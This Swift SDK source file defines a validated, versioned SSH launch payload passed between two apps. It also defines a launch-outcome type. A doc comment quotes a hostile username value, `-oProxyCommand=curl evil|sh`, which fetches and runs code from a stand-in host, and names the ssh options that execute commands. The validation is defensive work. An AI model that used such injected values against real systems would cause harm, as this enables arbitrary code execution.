import Foundation

/// The SSH launch contract between Leyline (which sends) and Terminal (which
/// receives), as ONE shared, versioned, validated type.
///
/// ## Why this is in the SDK
///
/// It was duplicated: `SSHLaunchPayload` (Encodable) in Leyline and `SSHLaunch`
/// (Decodable) in Terminal, hand-kept in sync across two repos with no shared
/// type and no version field. Two independent definitions of one wire format is
/// a contract that only appears to exist — nothing detects the moment they
/// diverge, and the failure lands on the user as "opening a connection does
/// nothing".
///
/// ## Why it validates
///
/// The receiving side turns this into an `ssh` argument vector. `host`,
/// `username` and `identityFile` all flow into that argv, and every one of them
/// originates in a text field. A `username` of `-oProxyCommand=curl evil|sh` is
/// arbitrary code execution — the same class of bug the audit found in git, in
/// a second place, with the same root cause: a value the adversary shapes being
/// read as an option. `validated()` is the single site that closes it for both
/// repos at once.
public struct SSHLaunchPayload: Codable, Equatable, Sendable {
    /// Wire discriminator. Terminal rejects a payload whose kind isn't "ssh".
    public let kind: String
    /// Payload schema version. Absent in generation-7 payloads, which decode as
    /// version 1 — so an older Leyline can still drive a newer Terminal.
    public let version: Int
    public let host: String
    public let port: Int
    public let username: String
    public let identityFile: String?

    public static let currentVersion = 1

    public init(host: String, port: Int, username: String, identityFile: String? = nil) {
        self.kind = "ssh"
        self.version = Self.currentVersion
        self.host = host
        self.port = port
        self.username = username
        self.identityFile = identityFile
    }

    private enum CodingKeys: String, CodingKey { case kind, version, host, port, username, identityFile }

    public init(from decoder: Decoder) throws {
        let c = try decoder.container(keyedBy: CodingKeys.self)
        kind = try c.decode(String.self, forKey: .kind)
        guard kind == "ssh" else {
            throw DecodingError.dataCorruptedError(forKey: .kind, in: c, debugDescription: "not ssh")
        }
        // Generation-7 Leyline emitted no `version`; treat that as version 1
        // rather than refusing, so an un-upgraded plugin keeps working.
        version = try c.decodeIfPresent(Int.self, forKey: .version) ?? 1
        host = try c.decode(String.self, forKey: .host)
        port = try c.decode(Int.self, forKey: .port)
        username = try c.decode(String.self, forKey: .username)
        identityFile = try c.decodeIfPresent(String.self, forKey: .identityFile)
    }

    public var json: String {
        (try? String(decoding: JSONEncoder().encode(self), as: UTF8.self)) ?? "{\"kind\":\"ssh\"}"
    }

    public init?(json: String?) {
        guard let json, let data = json.data(using: .utf8),
            let decoded = try? JSONDecoder().decode(SSHLaunchPayload.self, from: data)
        else { return nil }
        self = decoded
    }

    public enum ValidationError: Error, Equatable {
        case emptyHost
        case portOutOfRange(Int)
        case optionLikeValue(field: String, value: String)
        case unsupportedVersion(Int)
    }

    /// Returns self when every field is safe to place in an `ssh` argv.
    ///
    /// Rejects any value that begins with `-`: `ssh` would read it as an
    /// option, and its option surface includes `-o ProxyCommand=<cmd>`,
    /// `-o LocalCommand=<cmd>` and `-o PermitLocalCommand=yes` — each of which
    /// runs a shell command. A leading dash is never legitimate here (no
    /// hostname, username or path begins with one), so rejecting rather than
    /// escaping loses nothing.
    public func validated() throws -> SSHLaunchPayload {
        guard version <= Self.currentVersion else { throw ValidationError.unsupportedVersion(version) }
        guard !host.trimmingCharacters(in: .whitespaces).isEmpty else { throw ValidationError.emptyHost }
        guard (1...65535).contains(port) else { throw ValidationError.portOutOfRange(port) }
        for (field, value) in [("host", host), ("username", username), ("identityFile", identityFile ?? "")] {
            if value.hasPrefix("-") {
                throw ValidationError.optionLikeValue(field: field, value: value)
            }
        }
        return self
    }
}

/// The result of asking the host to open another app.
///
/// `PluginAppLauncher.open` returned `Void`, so a caller could not tell an
/// opened app from a missing, disabled or refused one. Leyline's "connect"
/// button therefore looked identical whether Terminal launched or was not
/// installed — a silent failure by construction (root cause RC-5 again, at the
/// plugin boundary this time).
public enum PluginLaunchOutcome: Equatable, Sendable {
    case opened
    /// No app with that id is registered.
    case unknownApp(String)
    /// Registered, but disabled by the user.
    case disabled(String)
    /// The host declined — e.g. a malformed payload.
    case refused(reason: String)
}

/// Opt-in richer launcher, discovered by dynamic cast (see
/// `PluginInstanceIdentity` for why capability is added this way rather than by
/// extending `PluginAppLauncher`).
@MainActor public protocol PluginAppLauncherResult {
    /// Like `open(appID:payload:)`, but says what happened.
    func openReportingOutcome(appID: String, payload: String?) -> PluginLaunchOutcome
}
